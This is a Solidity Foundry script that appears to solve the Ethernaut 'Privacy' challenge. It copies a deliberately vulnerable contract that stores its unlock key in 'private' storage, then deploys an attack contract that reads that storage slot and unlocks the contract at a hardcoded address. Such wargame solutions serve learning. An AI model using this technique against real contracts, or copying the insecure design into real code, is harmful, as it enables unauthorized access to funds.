// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}


contract PrivacyAttack {
    Privacy privacy;
    constructor (address target) payable {
        privacy = Privacy(target);
    }

    function attack (bytes32 slotValue) public {
        privacy.unlock(bytes16(slotValue));
    }
}


contract DeployScript is Script {
    function setUp() public view {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        address privacyInstance = 0xC82d7abAFc7b6c495A7DC207fd9F0F744F9a79C0;

        PrivacyAttack attacker = new PrivacyAttack(privacyInstance);
        attacker.attack(0xec51c06f6e7b0a5f349a3030cb0faeedfa184f223babd0474f42ff46ee6007a4);
        vm.stopBroadcast();
    }
}